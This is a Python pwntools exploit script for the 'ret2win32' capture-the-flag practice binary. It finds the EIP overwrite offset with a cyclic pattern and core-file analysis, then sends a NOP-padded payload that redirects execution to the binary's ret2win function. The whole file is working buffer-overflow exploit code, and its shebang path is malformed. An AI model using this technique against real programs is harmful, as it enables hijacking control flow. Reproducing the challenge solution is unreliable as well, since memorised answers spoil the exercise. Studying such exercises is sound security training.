#!/bin/usr/python3

from pwn import *

def start():
    binary_path = './ret2win32'
    p = process(binary_path) 
    gdb.attach(p, gdbscript='''
        
        break main
        continue
    ''')
    return p


elf = context.binary =  ELF("./ret2win32")
#p = process(elf.path)

# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'
# Delete core files after finished
context.delete_corefiles = True

io = start()
info("%#x target: ret2win", elf.symbols.ret2win)# Send the payload
#context.terminal = ['tmux', 'splitw', '-h']
#context.terminal = ['tmux']
payload = cyclic(100)
io.sendlineafter(">", payload)

io.wait()

core = io.corefile

# Print out the address of ESP at the time of crashing
esp_value = core.esp
info("esp_value = %#x", esp_value)
esp_offset = cyclic_find(esp_value)
info('located ESP offset at {a}'.format(a=esp_offset))

# Print out the address of EIP at the time of crashing
eip_value = core.eip
info("eip_value = %#x", eip_value)
eip_offset = cyclic_find(eip_value)
info('located EIP offset at {a}'.format(a=eip_offset))

# Craft a new payload which puts the "target" address at the correct offset
payload = flat(
    asm('nop') * eip_offset,
    elf.symbols.ret2win
)
f = open("./payload", "wb")
f.write(payload)
f.close()
# Send the payload to a new copy of the process
io = start()
io.sendlineafter(">", payload)
while 1:
	tmp = io.recv()
	info(tmp)
#print(tmp1)
#tmp2 = io.recv()
#print(tmp2)
#tmp3 = io.recv()
#print(tmp3)
# Get our flag!
#flag = io.recvline()
#success(flag)

#print(flag)
